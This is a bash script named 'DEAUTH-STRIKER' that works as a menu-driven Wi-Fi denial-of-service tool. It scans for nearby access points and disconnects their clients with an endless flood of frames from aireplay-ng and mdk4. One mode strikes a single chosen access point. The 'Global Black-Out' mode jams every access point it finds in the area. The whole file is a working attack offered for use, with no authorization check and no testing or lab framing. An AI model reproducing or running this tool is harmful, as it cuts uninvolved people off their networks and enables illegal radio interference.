#!/bin/bash

# DEAUTH-STRIKER v1.0
# Focused Deauthentication Engine for Intel BE200/AX211 (iwlwifi)
# Minimalist. High-Performance. No Bloat.

# Global Variables
IFACE=""
ORIGINAL_MAC=""
CURRENT_CHANNEL=1
ATTACK_PID=0
MONITOR_ACTIVE=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Initialize
init() {
    clear
    check_root
    detect_interface
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[ERROR] Run as root${NC}"
        exit 1
    fi
}

detect_interface() {
    IFACE=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    if [[ -z "$IFACE" ]]; then
        echo -e "${RED}[ERROR] No wireless interface${NC}"
        exit 1
    fi
    ORIGINAL_MAC=$(ip link show "$IFACE" | awk '/ether/ {print $2}')
}

# Draw Header
draw_header() {
    clear
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║         DEAUTH-STRIKER v1.0 - Intel BE200/AX211          ║"
    echo "║              Focused Deauthentication Engine              ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Draw Menu
draw_menu() {
    echo -e "${WHITE}[INTERFACE]${NC} $IFACE ${WHITE}[CHANNEL]${NC} $CURRENT_CHANNEL ${WHITE}[MAC]${NC} ${ORIGINAL_MAC:0:8}..."
    echo ""
    echo -e "${CYAN}[1]${NC} Start Monitor Mode"
    echo -e "${CYAN}[2]${NC} Scan for Targets"
    echo -e "${CYAN}[3]${NC} Targeted Strike (Single AP)"
    echo -e "${CYAN}[4]${NC} Global Black-Out (Area Denial)"
    echo -e "${CYAN}[5]${NC} Clean Exit"
    echo ""
    echo -n -e "${GREEN}[SELECT]${NC} Option [1-5]: "
}

# Intel-safe channel lock
lock_channel() {
    local channel=$1
    echo -e "${YELLOW}[LOCK]${NC} Setting channel to $channel..."
    iw dev "$IFACE" set channel "$channel" 2>/dev/null
    if [[ $? -eq 0 ]]; then
        CURRENT_CHANNEL=$channel
        echo -e "${GREEN}[OK]${NC} Channel locked to $channel"
    else
        echo -e "${RED}[ERROR]${NC} Failed to lock channel $channel"
        return 1
    fi
}

# Auto-resurrection for attacks
resurrect_attack() {
    local attack_cmd="$1"
    while true; do
        if [[ $ATTACK_PID -ne 0 ]] && ! kill -0 $ATTACK_PID 2>/dev/null; then
            echo -e "${RED}[ALERT]${NC} Attack died! Resurrecting..."
            eval "$attack_cmd" &
            ATTACK_PID=$!
            echo -e "${GREEN}[RESURRECTED]${NC} PID: $ATTACK_PID"
        fi
        sleep 1
    done
}

# Module 1: Start Monitor Mode
module1_monitor() {
    echo -e "${CYAN}[MODULE 1]${NC} Start Monitor Mode"
    
    # Kill interfering processes
    echo -e "${YELLOW}[CLEAN]${NC} Killing interfering processes..."
    airmon-ng check kill 2>/dev/null
    
    # Intel-safe monitor mode
    echo -e "${YELLOW}[MODE]${NC} Enabling monitor mode..."
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor
    ip link set "$IFACE" up
    
    if iw dev "$IFACE" info | grep -q "type monitor"; then
        MONITOR_ACTIVE=true
        echo -e "${GREEN}[SUCCESS]${NC} Monitor mode active on $IFACE"
    else
        echo -e "${RED}[ERROR]${NC} Failed to enable monitor mode"
        return 1
    fi
}

# Module 2: Scan for Targets
module2_scan() {
    echo -e "${CYAN}[MODULE 2]${NC} Scan for Targets"
    
    if [[ "$MONITOR_ACTIVE" != true ]]; then
        echo -e "${RED}[ERROR]${NC} Monitor mode not active. Run [1] first."
        return 1
    fi
    
    echo -e "${YELLOW}[SCANNING]${NC} Live airodump-ng (Press Ctrl+C to stop)"
    echo -e "${CYAN}[INFO]${NC} Note BSSID and Channel for Targeted Strike"
    echo ""
    airodump-ng "$IFACE"
}

# Module 3: Targeted Strike
module3_targeted() {
    echo -e "${CYAN}[MODULE 3]${NC} Targeted Strike (Single AP)"
    
    if [[ "$MONITOR_ACTIVE" != true ]]; then
        echo -e "${RED}[ERROR]${NC} Monitor mode not active. Run [1] first."
        return 1
    fi
    
    echo -e "${YELLOW}[SCANNING]${NC} Getting targets..."
    
    # Quick scan to get actual targets
    local scan_file="/tmp/scan_temp.csv"
    airodump-ng --output-format csv --write /tmp/scan_temp "$IFACE" >/dev/null 2>&1 &
    local scan_pid=$!
    sleep 10
    kill $scan_pid 2>/dev/null
    
    # Parse scan results for BSSID and channel
    local targets=()
    while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacon iv lanip id_length essid key; do
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" != "BSSID" ]]; then
            targets+=("$bssid|$channel|${essid:-Hidden}")
        fi
    done < /tmp/scan_temp-01.csv 2>/dev/null
    
    rm -f /tmp/scan_temp-*.csv 2>/dev/null
    
    if [[ ${#targets[@]} -eq 0 ]]; then
        echo -e "${RED}[ERROR]${NC} No targets found."
        return 1
    fi
    
    echo -e "${GREEN}[FOUND]${NC} ${#targets[@]} targets:"
    echo ""
    local i=1
    for target in "${targets[@]}"; do
        local bssid=$(echo "$target" | cut -d'|' -f1)
        local channel=$(echo "$target" | cut -d'|' -f2)
        local essid=$(echo "$target" | cut -d'|' -f3)
        echo -e "${CYAN}[$i]${NC} $bssid (Channel: $channel) SSID: $essid"
        ((i++))
    done
    
    echo ""
    echo -n -e "${YELLOW}[SELECT]${NC} Enter target number: "
    read target_num
    
    if [[ ! "$target_num" =~ ^[0-9]+$ ]] || [[ "$target_num" -lt 1 ]] || [[ "$target_num" -gt ${#targets[@]} ]]; then
        echo -e "${RED}[ERROR]${NC} Invalid selection"
        return 1
    fi
    
    # Get selected target
    local selected_target="${targets[$((target_num-1))]}"
    local BSSID=$(echo "$selected_target" | cut -d'|' -f1)
    local CHANNEL=$(echo "$selected_target" | cut -d'|' -f2)
    
    # Lock channel (Intel-critical)
    lock_channel "$CHANNEL" || return 1
    sleep 1
    
    echo -e "${YELLOW}[ATTACK]${NC} Starting DEADLY deauth attack on $BSSID"
    echo -e "${CYAN}[INFO]${NC} Press Ctrl+C to stop attack"
    
    # Start mdk4 in background for continuous flood
    mdk4 "$IFACE" d &
    local mdk_pid=$!
    
    # Aggressive multi-threaded attack
    while true; do
        # Multiple concurrent deauth streams
        aireplay-ng -0 100 -a "$BSSID" "$IFACE" 2>/dev/null &
        aireplay-ng -0 100 -a "$BSSID" "$IFACE" 2>/dev/null &
        aireplay-ng -0 100 -a "$BSSID" "$IFACE" 2>/dev/null &
        
        # Continuous flood with no delay
        sleep 0.1
    done
}

# Module 4: Global Black-Out
module4_blackout() {
    echo -e "${CYAN}[MODULE 4]${NC} Global Black-Out (Area Denial)"
    
    if [[ "$MONITOR_ACTIVE" != true ]]; then
        echo -e "${RED}[ERROR]${NC} Monitor mode not active. Run [1] first."
        return 1
    fi
    
        
    echo -e "${YELLOW}[SCANNING]${NC} Getting actual targets..."
    
    # Quick scan to get actual targets
    local scan_file="/tmp/scan_temp.csv"
    airodump-ng --output-format csv --write /tmp/scan_temp "$IFACE" >/dev/null 2>&1 &
    local scan_pid=$!
    sleep 10
    kill $scan_pid 2>/dev/null
    
    # Parse scan results for BSSID and channel
    local targets=()
    while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacon iv lanip id_length essid key; do
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$bssid" != "BSSID" ]]; then
            targets+=("$bssid|$channel")
        fi
    done < /tmp/scan_temp-01.csv 2>/dev/null
    
    rm -f /tmp/scan_temp-*.csv 2>/dev/null
    
    if [[ ${#targets[@]} -eq 0 ]]; then
        echo -e "${RED}[ERROR]${NC} No targets found. Run [2] Scan first."
        return 1
    fi
    
    echo -e "${GREEN}[FOUND]${NC} ${#targets[@]} targets"
    for target in "${targets[@]}"; do
        local bssid=$(echo "$target" | cut -d'|' -f1)
        local channel=$(echo "$target" | cut -d'|' -f2)
        echo -e "  ${CYAN}•${NC} $bssid (Channel: $channel)"
    done
    
    echo -e "${YELLOW}[ATTACK]${NC} Starting DEADLY attack on found targets only"
    echo -e "${CYAN}[INFO]${NC} Press Ctrl+C to stop"
    
    # Start mdk4 in background for continuous flood
    mdk4 "$IFACE" d &
    local mdk_pid=$!
    
    while true; do
        for target in "${targets[@]}"; do
            local bssid=$(echo "$target" | cut -d'|' -f1)
            local channel=$(echo "$target" | cut -d'|' -f2)
            
            lock_channel "$channel" 2>/dev/null
            
            # Multiple simultaneous attacks per target
            aireplay-ng -0 50 -a "$bssid" "$IFACE" 2>/dev/null &
            aireplay-ng -0 50 -a "$bssid" "$IFACE" 2>/dev/null &
            aireplay-ng -0 50 -a "$bssid" "$IFACE" 2>/dev/null &
            
            sleep 0.05
        done
    done
}

# Module 5: Clean Exit
module5_exit() {
    echo -e "${CYAN}[MODULE 5]${NC} Clean Exit"
    
    echo -e "${YELLOW}[CLEAN]${NC} Killing all attacks..."
    if [[ $ATTACK_PID -ne 0 ]]; then
        kill -9 $ATTACK_PID 2>/dev/null
    fi
    pkill -9 -f mdk4 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    pkill -9 -f resurrect_attack 2>/dev/null
    
    # Kill any background children
    kill $(jobs -p) 2>/dev/null
    
    echo -e "${YELLOW}[RESTORE]${NC} Restoring interface..."
    ip link set "$IFACE" down
    iw dev "$IFACE" set type managed
    ip link set "$IFACE" up
    
    echo -e "${YELLOW}[RESTORE]${NC} Restoring MAC..."
    macchanger --mac="$ORIGINAL_MAC" "$IFACE" 2>/dev/null
    
    echo -e "${YELLOW}[RESTORE]${NC} Restarting NetworkManager..."
    systemctl restart NetworkManager 2>/dev/null
    
    echo -e "${GREEN}[DONE]${NC} System restored"
    exit 0
}

# Main Loop
main() {
    init
    
    while true; do
        draw_header
        draw_menu
        read -r choice
        
        case $choice in
            1) module1_monitor ;;
            2) module2_scan ;;
            3) module3_targeted ;;
            
            4) module4_blackout ;;
            5) module5_exit ;;
            *) echo -e "${RED}[ERROR]${NC} Invalid option" ;;
        esac
        
        echo ""
        echo -n -e "${YELLOW}[PRESS]${NC} Enter to continue..."
        read
    done
}

# Signal Handlers
trap module5_exit SIGINT SIGTERM

# Run
main
